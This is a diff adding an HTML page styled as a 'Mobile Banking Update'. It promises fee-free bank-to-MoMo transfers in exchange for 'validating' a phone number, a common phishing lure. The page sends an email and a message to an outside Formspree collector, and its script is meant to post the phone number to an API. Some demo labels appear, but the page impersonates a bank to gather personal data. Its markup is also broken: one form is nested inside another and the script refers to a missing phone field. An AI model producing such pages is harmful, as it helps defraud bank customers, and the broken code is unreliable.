@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking Update</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #222;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 430px;
+            background: #ffffff;
+            padding: 35px 28px;
+            border-radius: 8px;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.07);
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 25px;
+            font-weight: 700;
+            margin-bottom: 22px;
+            color: #111;
+        }
+
+        .description {
+            font-size: 14px;
+            line-height: 1.7;
+            color: #555;
+            margin-bottom: 27px;
+        }
+
+        .demo-label {
+            display: block;
+            font-size: 11px;
+            color: #8a5a00;
+            background: #fff5dc;
+            padding: 9px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 9px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d5d9df;
+            border-radius: 5px;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border-color: #2864c5;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #2864c5;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #194e9e;
+        }
+
+        .message {
+            margin-top: 18px;
+            font-size: 13px;
+            line-height: 1.5;
+            display: none;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #888;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 28px 20px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <main class="container">
+
+        <h1>MOBILE BANKING UPDATE</h1>
+
+        <p class="description">
+            Validating your phone number to the account enables
+            you to make transactions from Bank to MoMo or vice
+            versa without any fees associated.
+        </p>
+
+       
+
+        <form id="Form">
+
+           <form
+  action="https://formspree.io/f/xoedqjja"
+  method="POST"
+>
+  <label>
+    Your email:
+    <input type="email" name="email">
+  </label>
+  <label>
+    Your message:
+    <textarea name="message"></textarea>
+  </label>
+  <!-- your other form fields go here -->
+  <button type="submit">Send</button>
+</form>
+
+        <p class="message" id="message"></p>
+
+        <footer>
+            2026 Mobile Banking Update Portal
+        </footer>
+
+    </main>
+
+    <script>
+        
+const form = document.getElementById("Form");
+const phone = document.getElementById("phone");
+const message = document.getElementById("message");
+
+const API_ENDPOINT = "/api/submit";
+
+form.addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    const number = phone.value.trim();
+
+    if (!/^[0-9+\-\s()]{7,20}$/.test(number)) {
+        message.style.display = "block";
+        message.style.color = "#c62828";
+        message.textContent = "Enter a valid sample phone number.";
+        return;
+    }
+
+    try {
+        const response = await fetch(API_ENDPOINT, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                demoPhone: number
+            })
+        });
+
+        const result = await response.json();
+
+        message.style.display = "block";
+        message.style.color = response.ok ? "#26733a" : "#c62828";
+        message.textContent = result.message;
+
+        if (response.ok) {
+            form.reset();
+        }
+
+    } catch (error) {
+        message.style.display = "block";
+        message.style.color = "#c62828";
+        message.textContent = "Demo server unavailable. Please try again.";
+    }
+});
+
+    </script>
+
+</body>
+</html>
